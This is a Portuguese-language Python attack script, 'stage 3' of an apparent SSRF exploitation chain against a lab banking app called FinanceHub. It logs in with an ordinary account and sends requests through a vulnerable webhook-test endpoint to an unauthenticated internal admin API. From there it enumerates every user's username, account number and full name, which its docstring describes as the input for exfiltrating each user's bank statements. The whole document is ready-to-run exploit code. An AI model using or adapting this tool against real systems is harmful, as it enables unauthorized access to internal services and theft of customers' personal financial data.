#!/usr/bin/env python3
"""
ETAPA 3 - account_enumerator.py
Lista todas as contas pela API interna, via SSRF.

A API administrativa interna (ex.: 10.5.0.15:8080) expõe /admin/accounts SEM
autenticação. Como o servidor a alcança, o atacante obtém a lista completa de
usuários - o insumo para exfiltrar os extratos de cada um.
Ferramenta independente: edite o bloco CONFIGURAÇÃO abaixo e rode com Python.

    python account_enumerator.py
"""

import argparse
import json
import time

import httpx

# ==========================================================================
# CONFIGURAÇÃO
# ==========================================================================
APP_URL = "http://localhost:8000"   # onde a aplicação-alvo (FinanceHub) roda
USER, PASSWORD = "joao", "senha123"  # conta comum do atacante
INTERNAL_API = "10.5.0.15:8080"      # host:porta da API administrativa interna
# ==========================================================================


def login() -> str:
    r = httpx.post(f"{APP_URL}/auth/login",
                   json={"username": USER, "password": PASSWORD}, timeout=15)
    r.raise_for_status()
    return r.json()["access_token"]


def ssrf_get(token: str, url: str, timeout: float = 10.0) -> dict:
    start = time.perf_counter()
    try:
        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
                       headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        data = r.json().get("request", {})
    except Exception as exc:  # noqa: BLE001
        data = {"reached": False, "error": type(exc).__name__, "detail": str(exc)}
    data["_rtt_ms"] = round((time.perf_counter() - start) * 1000, 1)
    return data


def enumerate_accounts(token, internal_api):
    r = ssrf_get(token, f"http://{internal_api}/admin/accounts")
    try:
        data = json.loads(r.get("body") or "")
    except (json.JSONDecodeError, TypeError):
        return []
    return data.get("accounts", [])


def main(internal_api):
    token = login()
    print(f"# enumerando http://{internal_api}/admin/accounts via SSRF")
    accounts = enumerate_accounts(token, internal_api)
    for a in accounts:
        print(f"{a.get('username'):10} {a.get('account_number'):8} {a.get('full_name')}")
    if not accounts:
        print("# nenhuma conta")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Enumeração de contas via SSRF (API interna).")
    ap.add_argument("--internal-api", default=INTERNAL_API, dest="internal_api")
    a = ap.parse_args()
    main(a.internal_api)
